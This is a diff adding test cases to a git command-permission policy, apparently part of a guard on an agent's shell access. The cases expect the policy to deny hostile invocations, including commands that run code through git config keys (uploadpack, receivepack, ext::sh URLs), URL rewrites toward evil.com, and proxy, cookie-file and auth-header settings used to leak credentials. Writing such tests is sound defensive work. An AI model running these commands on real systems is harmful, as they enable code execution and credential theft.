@@ -1167,6 +1167,89 @@ tests:
     expected:
       decision: deny
 
+  # ============================================================
+  # R3 (Opus) findings — remote.*.uploadpack/receivepack/url, url.*.insteadOf,
+  # global http.* exfiltration channels
+  # ============================================================
+
+  # --- remote.<name>.{uploadpack,receivepack} are config-key equivalents
+  # of --upload-pack / --receive-pack and need the same deny posture. ---
+  - id: git-c-remote-uploadpack-deny
+    command: "git -c remote.origin.uploadpack=evil fetch"
+    expected:
+      decision: deny
+      rule_id: git-c-rce-keys
+  - id: git-c-remote-receivepack-deny
+    command: "git -c remote.origin.receivepack=evil push origin master"
+    expected:
+      decision: deny
+      rule_id: git-c-rce-keys
+
+  # --- remote.<name>.url=ext::CMD is the documented RCE clone-URL form. ---
+  - id: git-c-remote-url-ext-deny
+    command: "git -c remote.origin.url=ext::sh fetch"
+    expected:
+      decision: deny
+      rule_id: git-c-rce-keys
+
+  # --- url.<X>.insteadOf / pushInsteadOf rewrite URLs silently. ---
+  - id: git-c-url-insteadof-deny
+    command: "git -c url.git@evil:.insteadOf=https://github.com/ fetch origin"
+    expected:
+      decision: deny
+      rule_id: git-c-rce-keys
+  - id: git-c-url-pushinsteadof-deny
+    command: "git -c url.https://evil.com/.pushInsteadOf=https://github.com/ push origin"
+    expected:
+      decision: deny
+      rule_id: git-c-rce-keys
+
+  # --- Global http.{cookieFile,proxy,extraHeader,...} exfiltration channels.
+  # Distinct from per-URL forms (already covered) and TLS verification disable
+  # (also already covered). ---
+  - id: git-c-http-cookiefile-deny
+    command: "git -c http.cookieFile=/tmp/c fetch"
+    expected:
+      decision: deny
+      rule_id: git-c-exfil-keys
+  - id: git-c-http-proxy-deny
+    command: "git -c http.proxy=http://evil.com fetch"
+    expected:
+      decision: deny
+      rule_id: git-c-exfil-keys
+  - id: git-c-http-extraheader-deny
+    command: "git -c http.extraHeader=Authorization:Bearer fetch"
+    expected:
+      decision: deny
+      rule_id: git-c-exfil-keys
+
+  # --- Persistent setter form mirrors of the above (R3 fix) ---
+  - id: git-config-set-remote-uploadpack-deny
+    command: "git config remote.origin.uploadpack /tmp/evil"
+    expected:
+      decision: deny
+      rule_id: git-config-rce-keys-spaceform
+  - id: git-config-set-url-insteadof-deny
+    command: "git config url.git@evil:.insteadOf https://github.com/"
+    expected:
+      decision: deny
+      rule_id: git-config-rce-keys-spaceform
+  - id: git-config-set-http-proxy-deny
+    command: "git config http.proxy http://evil.com"
+    expected:
+      decision: deny
+      rule_id: git-config-exfil-keys
+
+  # --- Legit per-key uses must still allow (R3 false-positive guards) ---
+  - id: git-c-color-ui-allow-r3
+    command: "git -c color.ui=false log"
+    expected:
+      decision: allow
+  - id: git-c-diff-algorithm-allow-r3
+    command: "git -c diff.algorithm=histogram diff"
+    expected:
+      decision: allow
+
   # --- Credential URL: any scheme denies via `credential.*://**` ---
   - id: git-c-credential-arbitrary-scheme-deny
     command: "git -c credential.gopher://x.com.helper=/tmp/evil fetch"
